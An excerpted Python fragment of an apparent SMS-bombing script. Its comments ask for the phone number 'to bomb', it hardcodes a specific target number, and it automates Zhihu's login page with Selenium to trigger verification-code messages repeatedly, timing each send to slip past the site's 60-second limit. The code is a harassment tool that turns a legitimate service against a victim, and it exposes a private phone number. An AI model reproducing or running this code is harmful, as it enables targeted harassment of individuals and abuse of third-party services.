...
class HongZha(object):
    def __init__(self):
        self.phone = '15606029565'#input('请输入您要轰炸的号码：')
        self.num = 0
    ...
    def send_yzm(self,button,name):
        ...
        time.sleep(61) #两次发送的间隔必须在60秒以上。所以这边定义的是65秒
    def zhihu(self,name):
        while True:
            ...
            driver.find_element_by_xpath("//button[@class='Button AppHeader-login Button--blue']" ).click ()
            driver.find_element_by_xpath("//button[@class='Button Login-switchType Button--plain']").click()
